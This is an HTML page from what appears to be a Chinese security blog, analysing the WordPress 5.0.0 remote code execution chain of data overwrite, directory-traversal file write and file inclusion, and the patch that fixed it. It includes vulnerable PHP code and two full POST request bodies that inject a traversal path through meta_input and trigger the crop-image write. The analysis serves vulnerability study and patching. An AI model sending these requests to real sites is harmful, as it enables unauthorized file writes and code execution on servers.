@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="baidu-site-verification" content="Apimgg1hM4">
+<meta name="google-site-verification" content="ifZoQ94LmUy8sy2SVlrhnNGumEzL2SSrC4MQAq67iic">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,wordpress,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 前言该漏洞由RIPS团队发现并公开在其Blog,在其blog中可发现该漏洞为数据覆盖+目录穿越写文件+文件包含三个漏洞组成的远程代码执行漏洞。根据其提供的漏洞细节可发现在edit_post()中未对post数据做任何过滤，导致可以传入meta_input数组并最终对数据库内容进行覆盖。这一方法在发生在对媒体文件修改属性时调用，因此需要具有author权限，在操作的媒体文件数据中_wp_a">
+<meta name="keywords" content="代码审计,wordpress">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wordpress5.0.0 远程代码执行漏洞分析">
+<meta property="og:url" content="http://zhengbao.wang/wordpress5-0-0-远程代码执行漏洞分析/index.html">
+<meta property="og:site_name" content="Boogle&#39;s Blog">
+<meta property="og:description" content="0x00 前言该漏洞由RIPS团队发现并公开在其Blog,在其blog中可发现该漏洞为数据覆盖+目录穿越写文件+文件包含三个漏洞组成的远程代码执行漏洞。根据其提供的漏洞细节可发现在edit_post()中未对post数据做任何过滤，导致可以传入meta_input数组并最终对数据库内容进行覆盖。这一方法在发生在对媒体文件修改属性时调用，因此需要具有author权限，在操作的媒体文件数据中_wp_a">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73afd199832.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73b0194df09.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73b53c53f1e.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73b6b1a66ce.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73b3e3949ae.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73b4bae8510.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73b7516622b.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73cebf0ebff.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73cfa537baf.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73d0c431eed.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73d68ebd65d.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73d6c391f88.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/25/5c73d729d6495.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/02/5c7a2b9e20c0e.png">
+<meta property="og:updated_time" content="2019-03-07T03:38:51.293Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="wordpress5.0.0 远程代码执行漏洞分析">
+<meta name="twitter:description" content="0x00 前言该漏洞由RIPS团队发现并公开在其Blog,在其blog中可发现该漏洞为数据覆盖+目录穿越写文件+文件包含三个漏洞组成的远程代码执行漏洞。根据其提供的漏洞细节可发现在edit_post()中未对post数据做任何过滤，导致可以传入meta_input数组并最终对数据库内容进行覆盖。这一方法在发生在对媒体文件修改属性时调用，因此需要具有author权限，在操作的媒体文件数据中_wp_a">
+<meta name="twitter:image" content="https://i.loli.net/2019/02/25/5c73afd199832.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://zhengbao.wang/wordpress5-0-0-远程代码执行漏洞分析/">
+
+
+
+
+
+  <title>wordpress5.0.0 远程代码执行漏洞分析 | Boogle's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Boogle's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">没有网络安全，就没有国家安全</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://zhengbao.wang/wordpress5-0-0-远程代码执行漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/boogle.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">wordpress5.0.0 远程代码执行漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-26T17:10:16+08:00">
+                2019-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/wordpress5-0-0-远程代码执行漏洞分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/wordpress5-0-0-远程代码执行漏洞分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/wordpress5-0-0-远程代码执行漏洞分析/" class="leancloud_visitors" data-flag-title="wordpress5.0.0 远程代码执行漏洞分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>该漏洞由RIPS团队发现并公开在其<a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="noopener">Blog</a>,在其blog中可发现该漏洞为数据覆盖+目录穿越写文件+文件包含三个漏洞组成的远程代码执行漏洞。<br>根据其提供的漏洞细节可发现在<code>edit_post()</code>中未对post数据做任何过滤，导致可以传入<code>meta_input</code>数组并最终对数据库内容进行覆盖。这一方法在发生在对媒体文件修改属性时调用，因此需要具有author权限，在操作的媒体文件数据中<code>_wp_attached_file</code>字段指明了文件路径，而在对图片进行裁剪操作时，图片存放文章取决于该字段，因此可以实现目录穿越向任意目录写文件，最终可以将文件写入到主题文件进行包含的位置可实现远程代码执行。</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><h3 id="数据覆盖漏洞"><a href="#数据覆盖漏洞" class="headerlink" title="数据覆盖漏洞"></a>数据覆盖漏洞</h3><p>根据RIPS提供的信息，漏洞发生在<code>edit_post</code>方法和<code>update_post_meta</code>方法中，直接跟踪到这两个方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_post</span><span class="params">( $post_data = null )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>($postarr) )</span><br><span class="line">        $postarr = &amp;$_POST;</span><br><span class="line">    ⋮</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">'meta_input'</span>] ) ) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ( $postarr[<span class="string">'meta_input'</span>] <span class="keyword">as</span> $field =&gt; $value ) &#123;</span><br><span class="line">            update_post_meta( $post_ID, $field, $value );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>edit_post</code>方法中发现对post来的数据未做任何处理。<br><img src="https://i.loli.net/2019/02/25/5c73afd199832.png" alt><br>而对图片属性进行修改时可直接诱发该方法<br><img src="https://i.loli.net/2019/02/25/5c73b0194df09.png" alt></p>
+<p>然后调用<code>update_post_meta</code>方法根据post_ID修改<code>post meta field</code>,调用<code>wp_update_post</code>方法更新post_data。<br><img src="https://i.loli.net/2019/02/25/5c73b53c53f1e.png" alt><br>在<code>wp_update_post</code>方法中会调用<code>wp_insert_post()</code><br><img src="https://i.loli.net/2019/02/25/5c73b6b1a66ce.png" alt><br>在<code>wp_insert_post()</code>方法中遍历meta_input调用<code>update_post_meta</code>对数据进行更新操作，<br><img src="https://i.loli.net/2019/02/25/5c73b3e3949ae.png" alt></p>
+<p>函数调用栈，<br><img src="https://i.loli.net/2019/02/25/5c73b4bae8510.png" alt></p>
+<p>至此可覆盖数据库中<code>_wp_attached_file</code>内容<br><img src="https://i.loli.net/2019/02/25/5c73b7516622b.png" alt><br>post数据包，只需在正常修改图片属性post数据中添加<code>&amp;meta_input[_wp_attached_file]=/test/boogle.jpg</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post</span><br><span class="line"></span><br><span class="line">_wpnonce=<span class="number">6</span>b7df5b262&amp;_wp_http_referer=%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit%<span class="number">26</span>message%<span class="number">3</span>D1&amp;user_ID=<span class="number">2</span>&amp;action=editpost&amp;originalaction=editpost&amp;post_author=<span class="number">2</span>&amp;post_type=attachment&amp;original_post_status=inherit&amp;referredby=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit&amp;_wp_original_http_referer=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit&amp;post_ID=<span class="number">7</span>&amp;meta-box-order-nonce=<span class="number">39163</span>aa91a&amp;closedpostboxesnonce=<span class="number">1e6416</span>f7d7&amp;post_title=avatar&amp;samplepermalinknonce=<span class="number">7548</span>fad608&amp;excerpt=<span class="number">123</span>&amp;_wp_attachment_image_alt=<span class="number">123</span>&amp;content=sdd&amp;attachment_url=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-content%<span class="number">2</span>Fuploads%<span class="number">2</span>F2019%<span class="number">2</span>F02%<span class="number">2</span>F2<span class="number">-4.</span>jpg%<span class="number">23</span>%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>Fthemes%<span class="number">2</span>Ftwentynineteen%<span class="number">2</span>F32.jpg&amp;original_publish=Update&amp;save=Update&amp;advanced_view=<span class="number">1</span>&amp;comment_status=open&amp;add_comment_nonce=<span class="number">17653878</span>f1&amp;_ajax_fetch_list_nonce=<span class="number">82034e96</span>c4&amp;_wp_http_referer=%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit%<span class="number">26</span>message%<span class="number">3</span>D1&amp;post_name=avatar<span class="number">-2</span>&amp;meta_input[_wp_attached_file]=/test/boogle.jpg</span><br></pre></td></tr></table></figure></p>
+<h3 id="目录穿越写文件"><a href="#目录穿越写文件" class="headerlink" title="目录穿越写文件"></a>目录穿越写文件</h3><p>上面我们已经能够控制<code>_wp_attached_file</code>的值，但这并什么带来什么实际影响，因此进行全局搜索，看看哪些地方用到了这个值，并进一步进行利用。<br>搜索发现在<code>get_attached_file()</code>方法中，对该值进行了获取，最拼接在<code>$file</code>变量中返回<br><img src="https://i.loli.net/2019/02/25/5c73cebf0ebff.png" alt></p>
+<blockquote>
+<p>补充：在wordpress在图片裁剪时，首先会从默认目录<code>wp-content\uploads\yyyy\mm</code>查找，如果不存在，则会从本地服务器下载，下载url为<code>http://127.0.0.1/wordpress/wp-content/uploads</code>+<code>_wp_attached_file</code>拼接的结果，这里可以使用url获取资源的特点，如<code>boogle.jpg?../../boo.jpg</code>本地查找不存在而下载时又会定位到boogle.jpg，而忽略<code>?</code>后面的内容。另外windows目录中不允许存在<code>?</code>，可以使用<code>#</code>代替。</p>
+</blockquote>
+<p>然后继续向上跟踪查看哪里调用了该方法。定位到<code>wp_crop_image()</code>方法，并且在该方法中进行了简单拼接作为文件名进行了保存，而该方法的作用为裁剪图片，即我们可以能控制裁剪操作后图片保存的位置。<br><img src="https://i.loli.net/2019/02/25/5c73cfa537baf.png" alt><br>继续向上跟踪，在<code>wp_ajax_crop_image()</code>方法中对裁剪方法进行了调用<br><img src="https://i.loli.net/2019/02/25/5c73d0c431eed.png" alt><br>跟踪到这时本来一切顺利，心思只要进行图片裁剪便会触发漏洞，然而还是水平太菜，没有触发漏洞，也没有定位到哪里调用了该方法，此处膜拜大佬。</p>
+<p>问题出现在在进行裁剪时没有调用该裁剪方法，而需要修改数据包手动调用。<br>在<code>admin-ajax.php</code>对这些方法进行了判断<br><img src="https://i.loli.net/2019/02/25/5c73d68ebd65d.png" alt></p>
+<p><img src="https://i.loli.net/2019/02/25/5c73d6c391f88.png" alt><br>最终在<code>apply_filters()</code>方法中，进行了动态调用<br><img src="https://i.loli.net/2019/02/25/5c73d729d6495.png" alt></p>
+<p>这里直接附post<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST </span><br><span class="line"></span><br><span class="line">action=crop-image&amp;_ajax_nonce=b<span class="number">259</span>baa<span class="number">5</span><span class="keyword">c</span><span class="number">9</span>&amp;postid=<span class="number">8</span>&amp;history=<span class="symbol">%5</span>B<span class="symbol">%7</span>B<span class="symbol">%22</span><span class="keyword">c</span><span class="symbol">%22</span><span class="symbol">%3</span>A<span class="symbol">%7</span>B<span class="symbol">%22</span><span class="keyword">x</span><span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">24</span><span class="symbol">%2</span>C<span class="symbol">%22</span>y<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%2</span>C<span class="symbol">%22</span>w<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">40</span><span class="symbol">%2</span>C<span class="symbol">%22</span>h<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">44</span><span class="symbol">%7</span>D<span class="symbol">%7</span>D<span class="symbol">%5</span>D&amp;<span class="keyword">target</span>=all&amp;context=&amp;do=save&amp;id=<span class="number">8</span>&amp;cropDetails[dst_width]=<span class="number">8</span>&amp;cropDetails[dst_height]=<span class="number">8</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>后面讲继续分析，这里可以参考<a href="https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A</a></p>
+<h2 id="0x02-补丁修复"><a href="#0x02-补丁修复" class="headerlink" title="0x02 补丁修复"></a>0x02 补丁修复</h2><p>补丁增加了对<code>meta_input</code>的过滤，将其从post中移除。<br><img src="https://i.loli.net/2019/03/02/5c7a2b9e20c0e.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/wordpress5-0-0-远程代码执行漏洞分析/">wordpress5.0.0 远程代码执行漏洞分析</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
+  <p><span>发布时间:</span>2019年02月26日 - 17:10</p>
+  <p><span>最后更新:</span>2019年03月07日 - 11:38</p>
+  <p><span>原始链接:</span><a href="/wordpress5-0-0-远程代码执行漏洞分析/" title="wordpress5.0.0 远程代码执行漏洞分析">http://zhengbao.wang/wordpress5-0-0-远程代码执行漏洞分析/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://zhengbao.wang/wordpress5-0-0-远程代码执行漏洞分析/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+    </div>
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+            <a href="/tags/wordpress/" rel="tag"><i class="fa fa-tag"></i> wordpress</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/windows-apache-php7-0安装php扩展之imagick踩过的大坑/" rel="next" title="windows+apache+php7.0安装php扩展之imagick踩过的大坑">
+                <i class="fa fa-chevron-left"></i> windows+apache+php7.0安装php扩展之imagick踩过的大坑
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/从http协议层面和数据库层面绕过waf/" rel="prev" title="从http协议层面和数据库层面绕过waf">
+                从http协议层面和数据库层面绕过waf <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/boogle.jpg" alt="boogle">
+            
+              <p class="site-author-name" itemprop="name">boogle</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aipp.me/" title="Aipp_SecurityBlog" target="_blank">Aipp_SecurityBlog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+    <div class="links-of-blogroll motion-element links-of-blogroll-block">
+      <div class="links-of-blogroll-title">
+        <!-- modify icon to fire by szw -->
+        <i class="fa fa-history fa-" aria-hidden="true"></i>
+        最近文章
+      </div>
+      <ul class="links-of-blogroll-list">
+        
+        
+          <li>
+            <a href="/Ljphpcms-v1-03代码审计之csrf-xss/" title="Ljphpcms_v1.03代码审计之csrf&&xss" target="_blank">Ljphpcms_v1.03代码审计之csrf&&xss</a>
+          </li>
+        
+          <li>
+            <a href="/burpsuite安装分块传输插件/" title="burpsuite安装分块传输插件" target="_blank">burpsuite安装分块传输插件</a>
+          </li>
+        
+          <li>
+            <a href="/semcms-php-v3-8任意文件刪除/" title="semcms_php_v3.8任意文件刪除" target="_blank">semcms_php_v3.8任意文件刪除</a>
+          </li>
+        
+          <li>
+            <a href="/semcms-php-v3-8-后台注入getshell/" title="semcms_php_v3.8 后台注入getshell" target="_blank">semcms_php_v3.8 后台注入getshell</a>
+          </li>
+        
+          <li>
+            <a href="/semcms-php-v3-8-时间盲注/" title="semcms_php_v3.8 时间盲注" target="_blank">semcms_php_v3.8 时间盲注</a>
+          </li>
+        
+      </ul>
+    </div>
+
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据覆盖漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">数据覆盖漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录穿越写文件"><span class="nav-number">2.2.</span> <span class="nav-text">目录穿越写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含"><span class="nav-number">2.3.</span> <span class="nav-text">文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-补丁修复"><span class="nav-number">3.</span> <span class="nav-text">0x02 补丁修复</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">boogle</span>
+
+  
+</div>
+
+
+
